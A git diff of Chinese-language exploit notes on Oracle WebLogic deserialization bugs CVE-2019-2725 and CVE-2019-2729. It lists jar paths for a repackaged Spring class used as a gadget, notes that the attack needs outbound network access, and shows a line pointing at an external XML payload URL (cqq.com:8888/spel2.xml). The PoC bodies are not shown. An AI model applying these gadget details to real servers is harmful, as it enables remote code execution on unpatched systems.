@@ -1,3 +1,9 @@
+这个类`com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext`在v10和v12都存在：
+- 10.3.6.0: `modules/com.bea.core.repackaged.springframework.spring_1.2.0.0_2-5-3.jar`
+- 12.1.3.0: `wlserver/modules/com.bea.core.repackaged.springframework.spring_1.5.0.0_2-5-3.jar`
+
+限制条件在于：服务器能否外联出网
+
 ### CVE-2019-2725_v10_v12
 poc:
 ```xml
@@ -17,7 +23,7 @@ http://cqq.com:8888/spel2.xml
 ```
 
 ### CVE-2019-2729_v10
-由于jdk的原因，`<array method="forName">`仅支持基于jdk6的v10.
+由于jdk的xmldecoder原因，`<array method="forName">`仅支持基于jdk6的v10.
 
 poc:
 ```xml
